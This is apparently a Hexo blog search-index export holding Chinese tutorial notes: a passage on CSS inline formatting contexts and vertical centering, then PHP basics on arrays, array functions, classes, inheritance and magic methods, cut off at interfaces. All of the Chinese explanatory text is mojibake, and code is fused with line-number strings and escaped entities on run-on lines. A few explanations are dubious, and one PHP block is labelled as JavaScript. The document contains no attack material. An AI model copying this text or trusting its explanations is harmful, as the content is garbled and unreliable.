boxé‡Œæœ‰ä¸ªæ¯”è¾ƒæ‰“çš„imageï¼‰ å½“å†…è”å…ƒç´ çš„å®½åº¦è¶…è¿‡line boxå®½åº¦ï¼Œé‚£ä¹ˆå®ƒä¼šæŠ˜è¡Œåˆ†è£‚æˆå‡ ä¸ªline boxï¼Œå¦‚æžœè¿™ä¸ªå…ƒç´ é‡Œé¢çš„å†…å®¹ä¸å¯ä»¥æŠ˜è¡Œï¼Œé‚£ä¹ˆå†…è”å…ƒç´ ä¼šæº¢å‡ºline boxã€‚ å½“ä¸€ä¸ªå†…è”å…ƒç´ åˆ†è£‚æ—¶ï¼Œåˆ†è£‚å¤„çš„marginï¼Œborderå’Œpaddingä¸ä¼šæœ‰è§†è§‰æ•ˆæžœã€‚ line boxçš„ç”Ÿå­˜æ¡ä»¶æ—¶IFCä¸­åŒ…å«inine-levelå…ƒç´ ï¼Œå¦‚æžœline boxæ²¡æœ‰æ–‡æœ¬ï¼Œç©ºç™½ï¼Œæ¢è¡Œç¬¦ï¼Œå†…è”å…ƒç´ ï¼Œä¹Ÿç­æœ‰å…¶ä»–çš„å­˜åœ¨IFCçŽ¯å¢ƒä¸­çš„å…ƒç´ ï¼ˆå¦‚inline-blockï¼Œinline-tableï¼Œimageç­‰ï¼‰ï¼Œå°†è¢«è§†ä¸ºé›¶é«˜åº¦ï¼Œä¹Ÿå°†è¢«è§†ä¸ºæ²¡æ„ä¹‰ã€‚ 123456789101112131415161718&lt;style&gt; .verticle-middle &#123; width: 150px; height: 200px; background-color: #ccc; &#125; .verticle-middle span &#123; padding: 20px; &#125;&lt;/style&gt;&lt;section class=&quot;verticle-middle ifc&quot;&gt; &lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt; &lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt; &lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt; &lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt;&lt;/section&gt; å®žä¾‹åº”ç”¨åœ¨ä¸€ä¸ªline boxä¸­ï¼Œå½“ä»–åŒ…å«çš„å†…éƒ¨å®¹å™¨çš„é«˜åº¦å°äºŽline boxçš„é«˜åº¦çš„æ—¶å€™ï¼Œå†…éƒ¨å®¹å™¨çš„åž‚ç›´ä½ç½®ç”±è‡ªå·±çš„verticalå±žæ€§æ¥ç¡®å®šã€‚é‚£ä¹ˆï¼Œæˆ‘ä»¬è®¾æƒ³ä¸€ä¸‹ï¼Œå¦‚æžœæ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªIFCçŽ¯å¢ƒï¼Œè®©line boxçš„é«˜åº¦æ—¶åŒ…å«å—çš„é«˜åº¦çš„100%ï¼Œè®©line boxå†…éƒ¨çš„å…ƒç´ ä½¿ç”¨vertical-align:middleï¼Œå°±å¯ä»¥å®žçŽ°åž‚ç›´å±…ä¸­äº†ã€‚ 12345678910111213141516171819202122232425262728293031323334&lt;style&gt; .verticle-middle &#123; width: 300px; height: 200px; background-color: #ccc; &#125; .verticle-middle &gt; div &#123; display: inline-block; vertical-align: middle; &#125; .verticle-middle img &#123; vertical-align: middle; &#125; .verticle-middle span &#123; padding: 20px; &#125; .ifc:after &#123; display: inline-block; content: &quot;&quot;; width: 0; height: 100%; vertical-align: middle; &#125;&lt;/style&gt;&lt;section class=&quot;verticle-middle ifc&quot;&gt; &lt;div&gt; &lt;img src=&quot;image/demo.jpg&quot; alt=&quot;&quot;&gt; &lt;span&gt;åž‚ç›´å±…ä¸­&lt;/span&gt; &lt;/div&gt;&lt;/section&gt;]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css IFC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpåŸºç¡€]]></title>
    <url>%2F2018%2F05%2F04%2Fphp%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[æ•°ç»„ç›´æŽ¥èµ‹å€¼å£°æ˜Ž ç´¢å¼•æ•°ç»„ï¼šä¸‹æ ‡ä¸ºæ•°å­— 12345$arr1[0] = 1;$arr1[1] = 2;$arr1[2] = 3;print_r($arr1);echo '&lt;br&gt;'; å…³è”æ•°ç»„ï¼šä¸‹æ ‡ä¸ºå­—ç¬¦ä¸² 12345$arr2['one'] = 1;$arr2['two'] = 2;$arr2['three'] = 3;print_r($arr2);echo '&lt;br&gt;'; */ []å’Œ{}å¯ä»¥è®¿é—®ä¸‹æ ‡ï¼Œå»ºè®®ä½¿ç”¨[]ï¼Œå› ä¸º echo â€œ$arr1{0}2222â€; æŠ¥é”™ 12echo $arr1[0];echo $arr1&#123;0&#125;; ä¸‹æ ‡æ˜¯å­—ç¬¦ä¸²ï¼Œæ•°å­—å­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•´æ•° 123$arr1['2'] = 'a';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; a )echo '&lt;br&gt;'; ä¾‹å¤–ï¼Œâ€™08â€™ä¸ä¼šè½¬åŒ–æˆ8ï¼Œè€Œæ˜¯â€™08â€™ï¼Œè¢«å½“ä½œå…«è¿›åˆ¶ 123$arr1['01'] = '01';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [01] =&gt; 01 )echo '&lt;br&gt;'; ä¸‹æ ‡æ˜¯æµ®ç‚¹æ•°ï¼Œå°æ•°éƒ¨åˆ†ä¼šè¢«èˆå¼ƒ 123$arr1[1.8] = 1.8;print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 1.8 [2] =&gt; 3 )echo '&lt;br&gt;'; ä¸‹æ ‡æ˜¯å¸ƒå°”å€¼ï¼Œtrueè½¬åŒ–ä¸º1ï¼Œfalseè½¬åŒ–ä¸º0 123$arr1[true] = 'true';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; true [2] =&gt; 3 )echo '&lt;br&gt;'; ä¸‹æ ‡æ˜¯nullï¼Œè½¬åŒ–ä¸ºç©ºå­—ç¬¦ä¸²â€™â€™ 123$arr1[null] = 'null';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [] =&gt; null )echo '&lt;br&gt;'; æ•°ç»„å’Œå¯¹è±¡åšä¸‹æ ‡ä¼šæœ‰è­¦å‘Š 12345678910$index = array();$arr1[$index] = '$index';print_r($arr1); // Warning: Illegal offset type */```[]`ä¸å†™ä¸‹æ ‡ï¼Œä¼šè‡ªåŠ¨å¢žåŠ ç´¢å¼•```js$arr1[] = '[]';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; [] ) é»˜è®¤ä»Žé›¶å¼€å§‹ï¼Œå½“å‰æ•°ç»„ç´¢å¼•å‡ºçŽ°è¿‡çš„æœ€å¤§å€¼åŠ 1 123$arr1[8] = 8;$arr1[] = '9';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [8] =&gt; 8 [9] =&gt; 9 ) å…³è”æ•°ç»„ä¸ä¼šå½±å“ç´¢å¼•ä¸‹æ ‡çš„æŽ’åˆ—è§„åˆ™ 1234$arr1['one'] = 'one';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [one] =&gt; one )$arr1[] = 'two';print_r($arr1); // Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [one] =&gt; one [3] =&gt; two ) ä½¿ç”¨arrayå£°æ˜Žæ•°ç»„ï¼Œé»˜è®¤æ˜¯ç´¢å¼•çš„ä¸‹æ ‡ï¼Œä»Ž0å¼€å§‹ 12$arr = array('a', 'b', 'c');print_r($arr); // Array ( [0] =&gt; a [1] =&gt; b [2] =&gt; c ) å¯ä»¥ä½¿ç”¨=&gt;ç¬¦å·æŒ‡å®šä¸‹æ ‡ 12$arr = array('aaa', 'two'=&gt;'bbb', 'ccc');print_r($arr); php5.4+ï¼Œå¯ä»¥ä½¿ç”¨ 12$arr = ['aaa', 'two'=&gt;'bbb', 'ccc'];print_r($arr); // Array ( [0] =&gt; aaa [two] =&gt; bbb [1] =&gt; ccc ) unsetåˆ é™¤æ•°ç»„ä¸­ä¸€ä¸ªå…ƒç´ ï¼Œarray_valuesé‡æ–°ç´¢å¼• 1234567$arr = ['a', 'b', 'c'];// `unset`åˆ é™¤æ•°ç»„ä¸­ä¸€ä¸ªå…ƒç´ unset($arr[1]);print_r($arr); // Array ( [0] =&gt; a [2] =&gt; c )// `array_values`é‡æ–°ç´¢å¼•$arr = array_values($arr);print_r($arr); // Array ( [0] =&gt; a [1] =&gt; c ) list()éåŽ†ï¼Œå·¦è¾¹æ˜¯listå‡½æ•°ï¼Œç­‰å·å³è¾¹åªèƒ½æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œåªèƒ½æ˜¯ç´¢å¼•æ•°ç»„ï¼ˆä¸‹æ ‡æ˜¯è¿žç»­çš„ï¼‰ï¼Œlist()ä¸­çš„å‚æ•°å’Œæ•°ç»„æ€»ä¸€ä¸€å¯¹åº” 12345$str = 'zs_ls_ww';list($a, $b, $c) = explode('_', $str);echo $a . '&lt;br&gt;'; // 'zs'echo $b . '&lt;br&gt;'; // 'ls'echo $c . '&lt;br&gt;'; // 'ww' each()éåŽ†ï¼Œeach()åªå¤„ç†å½“å‰å…ƒç´ ï¼ŒæŒ‡é’ˆæŒ‡å‘å½“å‰å…ƒç´ ï¼Œä¸‹ä¸€æ¬¡è°ƒç”¨ï¼ŒæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œæœ€åŽä¸€ä¸ªå…ƒç´ å†è°ƒç”¨è¿”å›žfalse 123456789$arr = ['zs', 'ls', 'ww'];$one = each($arr);echo '&lt;pre&gt;';print_r($one);echo '&lt;/pre&gt;';$two = each($arr);echo '&lt;pre&gt;';print_r($two);echo '&lt;/pre&gt;'; ç»“åˆlist()å’Œeach()éåŽ† 1234$arr = ['zs', 'ls', 'ww'];while (list($key, $val) = each($arr)) &#123; echo "&#123;$key&#125;".'---'."&#123;$val&#125;".'&lt;br&gt;';&#125; æ•°ç»„åœ°å€è®¿é—®æ–¹æ³• prev() next() reset() end() key() current() 12345$arr = ['one'=&gt;'1', 'two'=&gt;'2', 'three'=&gt;'3'];next($arr);print_r(key($arr)); // twoecho key($arr); // twoecho current($arr); // 2 è¶…å…¨å±€æ•°ç»„ï¼ˆå˜é‡ï¼‰ï¼Œåœ¨phpä¸­ï¼Œå·²ç»å£°æ˜Žå®Œçš„å˜é‡ï¼Œä½ å¯ä»¥ç›´æŽ¥å°±åŽ»ä½¿ç”¨ï¼Œå˜é‡åå­—å·²ç»è§„å®šå¥½äº†ï¼Œ$_SERVER $_ENV $_GET $_POST $_FILES $_COOKIE $_SESSION $GLOBALS 123foreach ($_SERVER as $key =&gt; $value) &#123; echo $key.'---&gt;'.$value.'&lt;br&gt;';&#125; æ•°ç»„ç›¸å…³çš„å‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637$lamp = array('os'=&gt;'Linux', 'webserver'=&gt;'Apache', 'db'=&gt;'Mysql', 'language'=&gt;'PHP', 'num'=&gt;10);Print_r($lamp);echo '&lt;br&gt;';// `array_values()` èŽ·å–æ•°ç»„å€¼$val = array_values($lamp);print_r($val);echo '&lt;br&gt;';// `array_keys(input, search_value, strict)` èŽ·å–æ•°ç»„é”®$key = array_keys($lamp, 'Apache', true);print_r($key);echo '&lt;br&gt;';// `in_array($needle, $haystack, strict)` æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ï¼Œè¿”å›žå¸ƒå°”å€¼$in = in_array('10', $lamp, true);echo $in ? 'åœ¨æ•°ç»„ä¸­':'ä¸åœ¨æ•°ç»„ä¸­';echo '&lt;br&gt;';// `array_search($needle, $haystack, strick)` æ£€æŸ¥æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŸä¸ªå€¼ï¼Œè¿”å›žé”®å$s = array_search('10', $lamp);echo $s;echo '&lt;br&gt;';// `array_key_exist($key, $haystack, strick)` æ£€æŸ¥æ•°ç»„ä¸­é”®åæ˜¯å¦å­˜åœ¨$k = array_key_exists('db', $lamp);echo $k ? 'é”®åœ¨æ•°ç»„ä¸­' : 'é”®ä¸åœ¨æ•°ç»„ä¸­';echo '&lt;br&gt;';// `array_flip($haystack)` äº¤æ¢æ•°ç»„ä¸­çš„é”®å’Œå€¼$f = array_flip($lamp);print_r($f);echo '&lt;br&gt;';// `array_reverse($haystack)` è¿”å›žä¸€ä¸ªå•å…ƒé¡ºåºç›¸åçš„æ•°ç»„$r = array_reverse($lamp);print_r($r); ç»Ÿè®¡æ•°ç»„å…ƒç´ ä¸ªæ•°å’Œå”¯ä¸€æ€§ 12345678910111213141516$lamp = ['os'=&gt;'Linux', 'Linux', 'webserver'=&gt;'Apache'];$web = [ 'lamp'=&gt;['os'=&gt;'Linux', 'webserver'=&gt;'Apache'], 'javaEE'=&gt;['os'=&gt;'Unix', 'webserver'=&gt;'Tomcat']];// `count($arr, $mode)`ï¼Œè®¡ç®—æ•°ç»„å…ƒç´ ä¸ªæ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºçœŸï¼Œé€’å½’ç´¯åŠ æ•°ç»„å…ƒç´ ä¸ªæ•°echo count($web, true);echo '&lt;br&gt;';// array_count_values($input)ï¼Œç»Ÿè®¡æ•°ç»„é‡å¤å€¼çš„å‡ºçŽ°ä¸ªæ•°print_r(array_count_values($lamp)); // Array ( [Linux] =&gt; 2 [Apache] =&gt; 1 )echo '&lt;br&gt;';// array_unique($arr) ï¼ŒåŽ»é™¤æ•°ç»„é‡å¤å€¼print_r(array_unique($lamp)); // Array ( [os] =&gt; Linux [webserver] =&gt; Apache ) ä½¿ç”¨å›žè°ƒå‡½æ•°å¤„ç†æ•°ç»„çš„å‡½æ•° array_filter($input, fn)è¿‡æ»¤æ•°ç»„ï¼Œä¸ä¼ å›žè°ƒå‡½æ•°ï¼Œè¿”å›žå€¼ä¸ºçœŸçš„å…ƒç´  1234567$arr = [1, 2, 3, null, -1, 'a', false, true];var_dump($arr);var_dump(array_filter($arr));var_dump(array_filter($arr, function($var) &#123; return $var % 2;&#125;));var_dump($arr); unset() åˆ é™¤æ•°ç»„æœ¬èº«çš„å…ƒç´  12unset($arr[1]);var_dump($arr); array_walk($arr, $fn, $userdata)å¯¹æ•°ç»„çš„æ¯ä¸ªæˆå‘˜åº”ç”¨ç”¨æˆ·å‡½æ•° 1234567$arr = [1, 2, 3, null, -1, 'a', false, true];array_walk($arr, function(&amp;$val, $key, $userdata) &#123; $val = $val * 2; echo $userdata; echo '&lt;br&gt;';&#125;, '###');print_r($arr); array_map($fn, $arr1, $arr2,...)ä½œç”¨äºŽæ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¸Š 12345$arr1 = [1, 2, 4];$arr2 = ['a', 'b', 'c'];array_map(function($val1, $val2) &#123; echo "&#123;$val1&#125; =&gt; &#123;$val2&#125;&lt;br&gt;";&#125;, $arr1, $arr2); å½“ç¬¬ä¸€å‚æ•°å›žè°ƒå‡½æ•°ä¸ºç©ºï¼Œè¿”å›žç»“æžœæ˜¯æ•°ç»„å¯¹åº”å„é¡¹åˆå¹¶ 123$arr3 = [false, true];$m = array_map(null, $arr1, $arr2, $arr3);var_dump($m); å†’æ³¡æŽ’åº123456789101112131415function bubbleSort($arr) &#123; $len = count($arr); for ($i = 0; $i &lt; $len; $i++) &#123; for ($j = 0; $j &lt; $len - 1 - $i; $j++) &#123; if($arr[$j] &gt; $arr[$j + 1]) &#123; $tmp = $arr[$j]; $arr[$j] = $arr[$j + 1]; $arr[$j + 1] = $tmp; &#125; &#125; &#125; return $arr;&#125;$arr = [0, 12, 2, 3, 14, 5, 6, 7, 8, 9];print_r(bubbleSort($arr)); æ•°ç»„æ‹†åˆ†ã€åˆå¹¶ã€åˆ†è§£ array_slice($arr, $offset, $len, true)ä»Žæ•°ç»„ä¸­å–å‡ºä¸€æ®µ 123$arr = ['a', 'b', 'c', 'd'];$narr = array_slice($arr, 2, 1, true);print_r($narr); // Array ( [2] =&gt; c ) array_splice(&amp;$input, $offset, $len, $replace) æŠŠæ•°ç»„ä¸­çš„ä¸€éƒ¨åˆ†åŽ»æŽ‰å¹¶ç”¨å…¶ä»–å€¼å–ä»£ 12345$arr = ['a', 'b'=&gt;2, 'c', 'd'];$narr = array_splice($arr, 1, 1, 'rrr');print_r($narr);echo '&lt;br&gt;';print_r($arr); array_combine($keys, $values) åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œç”¨ä¸€ä¸ªæ•°ç»„çš„å€¼ä½œä¸ºå…¶é”®åï¼Œå¦ä¸€ä¸ªæ•°ç»„ä½œä¸ºå…¶å€¼ 1234$arr1 = ['a', 'b', 'c'];$arr2 = ['php', 'linux', 'mysql'];$c = array_combine($arr1, $arr2);print_r($c); // Array ( [a] =&gt; php [b] =&gt; linux [c] =&gt; mysql ) +ä¸‹æ ‡ç›¸åŒçš„ä¼šè¦†ç›–ï¼Œå‰é¢çš„è¦†ç›–åŽé¢çš„ 12345$a = ['a', 'two'=&gt;'b', 'c'];$b = [7, 'two' =&gt; 8, 9];$c = $a + $b;print_r($c); // Array ( [0] =&gt; a [two] =&gt; b [1] =&gt; c )echo '&lt;br&gt;'; array_merge($arr1, $arr2, ...)åˆå¹¶æ•°ç»„ï¼Œç´¢å¼•æ•°ç»„ä¸‹æ ‡ç›¸åŒä¸è¦†ç›–ï¼Œå…³è”æ•°ç»„ä¸‹æ ‡ç›¸åŒä¼šè¦†ç›– 12$m = array_merge($a, $b);print_r($m); // Array ( [0] =&gt; a [two] =&gt; 8 [1] =&gt; c [2] =&gt; 7 [3] =&gt; 9 ) array_intersect($arr1, $arr2, $arr3...)è®¡ç®—æ•°ç»„äº¤é›† 1234$arr1 = [4, 5, 6, 7, 8];$arr2 = [5, 6, 7, 8, 9];$intersect= array_intersect($arr1, $arr2);print_r($intersect); // Array ( [1] =&gt; 5 [2] =&gt; 6 [3] =&gt; 7 [4] =&gt; 8 ) array_diff($arr1, $arr2) è®¡ç®—æ•°ç»„å·®é›† 1234$arr1 = [4, 5, 6, 7, 8];$arr2 = [5, 6, 7, 8, 9];$diff = array_diff($arr1, $arr2);print_r($diff); // Array ( [0] =&gt; 4 ) ç±»1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Person &#123; // åœ¨ç±»çš„æˆå‘˜å±žæ€§å‰é¢ä¸€å®šè¦æœ‰ä¸€ä¸ªä¿®é¥°è¯ï¼Œå¦‚æžœä¸çŸ¥é“ä½¿ç”¨ä»€ä¹ˆä¿®é¥°è¯ï¼Œå°±å¯ä»¥ä½¿ç”¨varï¼ˆå…³é”®å­—ï¼‰ // å¦‚æžœä¸€æ—¦æœ‰å…¶ä»–çš„ä¿®é¥°è¯å°±ä¸è¦æœ‰var // å˜é‡ï¼ˆæˆå‘˜å±žæ€§ï¼‰ private $name = 'wuwh'; private $age; private $gender; // æž„é€ æ–¹æ³• function __construct($name='', $age = 1, $gender = 'male') &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; // åœ¨ç›´æŽ¥è¯»å–ç§æœ‰å±žæ€§æ—¶è‡ªåŠ¨è°ƒç”¨ function __get($name) &#123; echo $name; echo '&lt;br&gt;'; return $this-&gt;$name; &#125; // åœ¨ç›´æŽ¥è®¾ç½®ç§æœ‰å±žæ€§æ—¶è°ƒç”¨ function __set($name, $value) &#123; $this-&gt;$name = $value; &#125; // åœ¨ä½¿ç”¨`isset()`åˆ¤æ–­ä¸€ä¸ªç§æœ‰å±žæ€§æ˜¯å¦å­˜åœ¨æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨`__isset()`æ–¹æ³• function __isset($name) &#123; if($name == 'name') &#123; return isset($this-&gt;$name); &#125; &#125; // åœ¨ä½¿ç”¨`unset()`åˆ é™¤ä¸€ä¸ªç§æœ‰å±žæ€§æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨`__unset()`æ–¹æ³• function __unset($name) &#123; if($name == 'name') &#123; unset($this-&gt;$name); &#125; &#125; // å‡½æ•°ï¼ˆæˆå‘˜æ–¹æ³•ï¼‰ // æ–¹æ³•å‰é¢åŠ ä¿®é¥°ç¬¦ `private`ï¼Œå¤–éƒ¨ä¸èƒ½è°ƒç”¨ï¼Œä½†æ˜¯å†…éƒ¨æ–¹æ³•å¯ä»¥è°ƒç”¨ function getName() &#123; return $this-&gt;name; &#125; function getAge() &#123; return $this-&gt;age; &#125; // ç§æœ‰æ–¹æ³• private function g() &#123; return $this-&gt;gender; &#125; function getGender() &#123; return $this-&gt;g(); &#125; // æžæž„æ–¹æ³• function __destruct() &#123; echo "destory &#123;$this-&gt;name&#125; over!"; &#125;&#125;$person = new Person('zhangsan', 11, 'female');echo $person-&gt;getName();echo '&lt;br&gt;';echo $person-&gt;getAge();echo '&lt;br&gt;';echo $person-&gt;getGender();echo '&lt;br&gt;';// é­”æœ¯æ–¹æ³•// `__get()` `__set()` `__isset()` `__unset()`// è¯»å–ç§æœ‰å±žæ€§ï¼Œè°ƒç”¨`__get()`æ–¹æ³•$person-&gt;name;// è®¾ç½®ç§æœ‰å±žæ€§ï¼Œè°ƒç”¨`__set()`æ–¹æ³•$person-&gt;name = 'abc';echo '&lt;br&gt;';/* unset($person-&gt;name);print_r($person); */if(isset($person-&gt;name)) &#123; echo 'å­˜åœ¨è¯¥å±žæ€§';&#125; else &#123; echo 'ä¸å­˜åœ¨è¯¥å±žæ€§';&#125; ç»§æ‰¿12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// `private`è¿™æ˜¯ç§æœ‰çš„ï¼Œåªèƒ½è‡ªå·±ç”¨ï¼Œå­ç±»ä¹Ÿä¸èƒ½ä½¿ç”¨// `protected`ä¿æŠ¤æƒé™ï¼Œåªèƒ½æ˜¯è‡ªå·±å’Œè‡ªå·±çš„å­ç±»ä¸­å¯ä»¥ä½¿ç”¨// `final`åœ¨ç±»å‰é¢åŠ è¿™ä¸ªå…³é”®å­—ï¼Œåˆ™ä¸èƒ½è®©è¿™ä¸ªç±»è¢«ç»§æ‰¿ï¼Œä¹Ÿå¯ä»¥ä¿®é¥°æ–¹æ³•ï¼Œä¸èƒ½è®©å­ç±»è¦†ç›–è¿™ä¸ªæ–¹æ³•class Person &#123; public $name; private $age; private $gender; public static $country = 'cn'; function __construct($name, $age, $gender) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; function say() &#123; echo "my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125; "; // `self`æŒ‡å‘ç±»æœ¬èº« echo 'my country is '.self::$country; echo '&lt;br&gt;'; &#125; function eat() &#123; echo 'person can eat'; &#125;&#125;class Student extends Person &#123; var $school; function __construct($name = '', $age = 1, $gender = 'male', $school = '') &#123; // è¦†ç›–çˆ¶ç±»ä¸­çš„`__construct()`æž„é€ æ–¹æ³• Parent::__construct($name, $age, $gender); $this-&gt;school = $school; &#125; function study() &#123; echo "before studying, say &#123;$this-&gt;name&#125;"; echo '&lt;br&gt;'; &#125; /* function say() &#123; echo "I am a student, my name is &#123;$this-&gt;name&#125;"; echo '&lt;br&gt;'; &#125; */ function say() &#123; // ç±»::æˆå‘˜ï¼Œä½¿ç”¨ `Parent::æˆå‘˜` è®¿é—®çˆ¶ç±»ä¸­è¢«è¦†ç›–çš„æ–¹æ³• Parent::say(); echo "my school is &#123;$this-&gt;school&#125;"; echo '&lt;br&gt;'; &#125;&#125;class Teacher extends Person &#123; var $job; function teach() &#123; echo( "before teaching, say &#123;$this-&gt;name&#125;"); &#125;&#125;$student = new Student('wuwh', 22, 'male', 'qing university');$student-&gt;say();$student-&gt;study();// `instanceof`if($student instanceof Person) &#123; echo '$studentå±žäºŽPersonç±»'; echo '&lt;br&gt;';&#125; else &#123; echo '$studentä¸å±žäºŽPersonç±»'; echo '&lt;br&gt;';&#125;// é™æ€æˆå‘˜åªèƒ½ç”¨ç±»æ¥è®¿é—®echo Student::$country; é­”æœ¯æ–¹æ³•12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788// é­”æœ¯æ–¹æ³• `__construct()` `__desctruct()` `__set()` `__get()` `__isset()` `__unset()`class Person &#123; public $name; public $age; public $gender; function __construct($name, $age, $gender) &#123; $this-&gt;name = $name; $this-&gt;age = $age; $this-&gt;gender = $gender; &#125; // é­”æœ¯æ–¹æ³•`__tostring()`ï¼Œåœ¨ç›´æŽ¥ä½¿ç”¨`echo` `print` `printf`è¾“å‡ºä¸€ä¸ªå¯¹è±¡å¼•ç”¨æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³• // å°†å¯¹è±¡çš„åŸºæœ¬ä¿¡æ¯æ”¾åœ¨`__tostring`å†…éƒ¨ï¼Œå½¢æˆå­—ç¬¦ä¸²è¿”å›ž // `__tostring()`ä¸èƒ½æœ‰å‚æ•°ï¼Œè¿”å›žä¸€ä¸ªå­—ç¬¦ä¸² function __toString() &#123; return "my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125;"; &#125; // åœ¨å…‹éš†å¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ // å’Œæž„é€ æ–¹æ³•ä¸€æ ·ï¼Œå¯¹æ–°å…‹éš†å¯¹è±¡è¿›è¡Œåˆå§‹åŒ– // `this`æŒ‡å‘å‰¯æœ¬ function __clone() &#123; echo 'clone...'; echo '&lt;br&gt;'; $this-&gt;name = 'clone wuwh'; $this-&gt;age = 100; $this-&gt;gender = 'female'; &#125; // è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³• // æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ–¹æ³•åï¼Œç¬¬äºŒä¸ªæ˜¯æ–¹æ³•çš„å‚æ•° function __call($method, $args) &#123; print_r("sorry, there is not exist the function which method &#123;$method&#125;, arguments are"); // print_r($args); // `serialize()`åºåˆ—åŒ–ï¼Œå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸² // `unserialize()`ååºåˆ—åŒ–ï¼Œå­—ç¬¦ä¸²è½¬åŒ–æˆå¯¹è±¡ echo '&lt;br&gt;'; echo serialize($args); echo '&lt;br&gt;'; &#125; // åœ¨åºåˆ—åŒ–æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ï¼Œè¿”å›žä¸€ä¸ªæ•°ç»„ä¸­å£°æ˜Žäº†çš„å±žæ€§åä¼šè¢«åºåˆ—åŒ– function __sleep() &#123; echo 'åºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨äº†...'; echo '&lt;br&gt;'; return array('name'); &#125; // åœ¨ååºåˆ—åŒ–æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³• function __wakeup() &#123; echo 'ååºåˆ—åŒ–è‡ªåŠ¨è°ƒç”¨äº†...'; echo '&lt;br&gt;'; &#125; // ä½¿ç”¨`var_export()`æ–¹æ³•æ—¶ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³• static function __set_state($arr) &#123; &#125; // `$person()`ï¼Œè‡ªåŠ¨è°ƒç”¨çš„æ–¹æ³•ï¼Œphp5.3+ function __invoke() &#123; echo 'å®žä¾‹è°ƒç”¨äº†'; echo '&lt;br&gt;'; &#125; // `Person::hello()`ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„é™æ€æ–¹æ³•æ—¶è‡ªåŠ¨è°ƒç”¨ static function __callStatic($method, $args) &#123; echo "ä½ è°ƒç”¨çš„é™æ€æ–¹æ³•&#123;$method&#125;ä¸å­˜åœ¨"; echo '&lt;br&gt;'; &#125; function say() &#123; print_r("my name is &#123;$this-&gt;name&#125;, my age is &#123;$this-&gt;age&#125;, my gender is &#123;$this-&gt;gender&#125;"); &#125;&#125;$person = new Person('wuwh', 22, 'male');// åºåˆ—åŒ–$ser = serialize($person);echo $ser;echo '&lt;br&gt;';// ååºåˆ—åŒ–$unser = unserialize($ser);echo $unser;echo '&lt;br&gt;';$p = clone $person;$p-&gt;say();$p-&gt;aaa('a', 'a', 'a');/* $ex = var_export($p, true);var_dump($ex); */// è°ƒç”¨é™æ€æ–¹æ³•`__invoke()`$p();// è°ƒç”¨ `__callStatic()`Person::hello(); æŽ¥å£1234567891011121314151617181920212223242526272829303132/** * æŽ¥å£å’ŒæŠ½è±¡ç±»å¯¹æ¯” * 1. æŽ¥å£ä¸­çš„æ–¹æ³•ï¼Œå¿…é¡»å…¨æ˜¯æŠ½è±¡æ–¹æ³• * 2. 